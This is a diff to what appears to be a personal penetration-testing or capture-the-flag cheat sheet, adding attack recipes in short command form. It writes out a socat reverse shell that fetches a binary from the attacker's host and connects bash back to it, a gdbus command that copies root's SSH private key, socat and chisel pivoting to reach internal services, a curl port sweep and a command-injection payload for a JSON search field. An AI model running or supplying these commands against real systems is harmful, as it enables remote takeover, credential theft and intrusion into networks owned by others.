@@ -65,6 +65,17 @@ In short, we can use tar as root, so we can:
 
 
 
+**Reverse Shell**
+IF TRADITIONAL REVERSE SHELL DOESN'T WORK, USE SOCAT ONE!
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
+Ex:
+1. Download the socat binary: wget https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat
+2. Open a socat listener: socat file:`tty`,raw,echo=0 TCP-L:1234
+3. Open a server to let the target download the socat: python3 -m http.server
+4. Execute the RCE: wget -q 10.8.102.36:8000/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.8.102.36:1234
+
+
+
 **Gdbuss Root SSH Privesc**
 1. gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/.ssh/id_rsa /tmp/root_rsa true
 https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/
@@ -72,6 +83,7 @@ https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubu
 
 
 **Chisel**
+Essentially port forwarding.
 - If there's an attempt to SSH or something outside the docker container we are in and we cant access it. We need to socks proxy stuff it somehow.
 - If we are trapped inside a docker container.
 
@@ -92,6 +104,27 @@ IF error, or stuff, just remove the local interface
 Ex: http://10.8.102.36:8080/ >> Our ip and the service port we want to proxy
 
 
+
+**Socat**
+- If there's specific service open like SSH or something, but portforwarding it doesnt work. You need to fork it.
+- Example case is like SSH service running locally.
+- Use netstat to check the service running.
+- With socat its like you are opening the service on the different port. (Like, previously not open SSH service [only run locally], you open it but on another port)
+- check `/etc/ssh/sshd_config` for the SSH details.
+
+On the target machine:
+==== If the target doenst have socat, just download it from https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat then transfer it.
+
+1. socat tcp-listen:[Anyport],reuseaddr,fork tcp:[The_service_IP]:[Service_pirt]
+Ex: socat tcp-listen:9999,reuseaddr,fork tcp:localhost:22
+
+ref: https://stackoverflow.com/questions/31193485/combining-socat-with-ssh-to-have-dynamic-port-forwarding-through-socks-proxy
+
+2. Now the service is open and you can access it
+Ex: ssh fox@[target-ip] -p 9999
+
+
+
 **LOGS**
 1. Always check /var/log/auth.log
 2. Always check /var/log/apache2/access.log
@@ -102,6 +135,13 @@ Ex: http://10.8.102.36:8080/ >> Our ip and the service port we want to proxy
 1. Fast internal network scan
 ex: curl http://[IP]:[Port range with the brackets]
 - curl http://10.10.11.88:[0-65353]
+
+
+
+**RCE**
+- PHP json_decode() case. (not guaranteed tbh)
+Ex:
+"search":"\";[command];echo \""
 
 
 
